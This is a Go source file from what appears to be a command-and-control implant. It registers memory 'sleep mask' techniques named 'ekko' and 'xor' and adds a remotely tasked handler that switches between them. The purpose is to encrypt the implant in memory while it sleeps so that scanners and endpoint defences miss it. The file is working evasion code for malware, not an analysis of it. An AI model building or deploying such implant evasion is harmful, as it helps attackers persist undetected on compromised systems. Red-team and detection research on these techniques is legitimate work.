//go:build linux || windows || darwin

package main

import (
	"encoding/json"
	"time"
)

type SleepMasker interface {
	Encrypt()
	Decrypt()
	BeforeSleep(durationMs uintptr)
	AfterWake()
	Name() string
}

var (
	activeSleepMask SleepMasker
	maskRegistry    = map[string]func() SleepMasker{}
	sleepObfFunc    func(uintptr)
)

type basicMask struct{}

func (m *basicMask) Encrypt() {
	sleepMaskEncrypt()
}

func (m *basicMask) Decrypt() {
	sleepMaskDecrypt()
}

func (m *basicMask) BeforeSleep(durationMs uintptr) {
	if sleepObfFunc != nil {
		sleepObfFunc(durationMs)
		return
	}
	time.Sleep(time.Duration(durationMs) * time.Millisecond)
}

func (m *basicMask) AfterWake() {}

func (m *basicMask) Name() string { return "ekko" }

type xorOnlyMask struct{}

func (m *xorOnlyMask) Encrypt() {
	sleepMaskEncrypt()
}

func (m *xorOnlyMask) Decrypt() {
	sleepMaskDecrypt()
}

func (m *xorOnlyMask) BeforeSleep(durationMs uintptr) {
	if sleepObfFunc != nil {
		sleepObfFunc(durationMs)
		return
	}
	time.Sleep(time.Duration(durationMs) * time.Millisecond)
}

func (m *xorOnlyMask) AfterWake() {}

func (m *xorOnlyMask) Name() string { return "xor" }

func init() {
	maskRegistry["ekko"] = func() SleepMasker { return &basicMask{} }
	maskRegistry["xor"] = func() SleepMasker { return &xorOnlyMask{} }
	activeSleepMask = &basicMask{}
}

func registerSleepMask(name string, factory func() SleepMasker) {
	maskRegistry[name] = factory
}

func getRegisteredMasks() []string {
	names := make([]string, 0, len(maskRegistry))
	for n := range maskRegistry {
		names = append(names, n)
	}
	return names
}

func setActiveSleepMask(technique string) bool {
	factory, ok := maskRegistry[technique]
	if !ok {
		return false
	}
	m := factory()
	if m == nil {
		return false
	}
	activeSleepMask = m
	return true
}

type setSleepMaskParams struct {
	Technique string `json:"technique"`
}

func handleSetSleepMask(task Task, res *TaskResult) {
	var params setSleepMaskParams
	if err := json.Unmarshal([]byte(task.Data), &params); err != nil {
		res.Error = "invalid params: " + err.Error()
		return
	}
	if params.Technique == "" {
		params.Technique = task.Command
	}
	if params.Technique == "" {
		masks := getRegisteredMasks()
		b := []byte("available masks: [")
		for i, m := range masks {
			if i > 0 {
				b = append(b, ", "...)
			}
			b = append(b, m...)
		}
		b = append(b, "]; current: "...)
		b = append(b, activeSleepMask.Name()...)
		res.Output = string(b)
		return
	}
	if !setActiveSleepMask(params.Technique) {
		res.Error = "unknown sleep mask technique: " + params.Technique
		masks := getRegisteredMasks()
		b := []byte("available masks: ")
		for i, m := range masks {
			if i > 0 {
				b = append(b, ", "...)
			}
			b = append(b, m...)
		}
		res.Output = string(b)
		return
	}
	res.Output = "sleep mask switched to: " + params.Technique
}
